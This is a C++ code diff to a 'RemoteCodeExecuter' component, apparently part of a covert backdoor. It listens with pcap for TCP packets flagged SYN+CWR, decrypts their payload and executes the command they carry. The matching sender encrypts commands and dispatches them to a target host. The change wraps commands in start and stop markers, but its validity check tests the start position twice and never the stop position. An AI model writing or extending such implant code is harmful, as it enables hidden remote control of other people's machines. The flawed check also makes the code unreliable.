@@ -33,7 +33,11 @@ int RemoteCodeExecuter::sendCommand(NetworkEngine *net, const struct in_addr dad
     ack = Crypto::rand();
 
     // convert command to payload
-    UCharVector payload(cmd.begin(), cmd.end());
+    std::string tmp;
+    tmp += CMD_START_STR;
+    tmp += cmd;
+    tmp += CMD_STOP_STR;
+    UCharVector payload(tmp.begin(), tmp.end());
 
     // encrypt
     UCharVector ciphertext = net->getCrypto()->enc(payload);
@@ -87,15 +91,24 @@ void RemoteCodeExecuter::netCallback(const pcap_pkthdr *header, const unsigned c
     unsigned char *payload = (unsigned char *)(packet + ETH_HLEN + (ip->ihl * 4) + (tcp->doff * 4));
     unsigned int payloadSize = header->len - ETH_HLEN - (ip->ihl * 4) - (tcp->doff * 4);
 
-    // decrypt
-    UCharVector ciphertext{};
-    ciphertext.assign(payload, payload + payloadSize);
-    UCharVector plaintext = net->getCrypto()->dec(ciphertext);
-
     // if command execute it
     if (tcp->syn && tcp->cwr) {
-        std::string tmp((char *)plaintext.data(), payloadSize);
-        executeCommand(net, ntohl(ip->saddr), tmp.c_str());
+        // decrypt
+        UCharVector ciphertext{};
+        ciphertext.assign(payload, payload + payloadSize);
+        UCharVector plaintextBuff = net->getCrypto()->dec(ciphertext);
+        std::string plaintext((char *)plaintextBuff.data(), payloadSize);
+
+        int cmdStartPos = plaintext.find(CMD_START_STR);
+        int cmdStopPos = plaintext.find(CMD_STOP_STR);
+
+        if (cmdStartPos == std::string::npos || cmdStartPos == std::string::npos) {
+            return;
+        }
+
+        plaintext[cmdStopPos] = 0;
+
+        executeCommand(net, ntohl(ip->saddr), &plaintext[strlen(CMD_START_STR)]);
     }
 
     // if it is a response print it
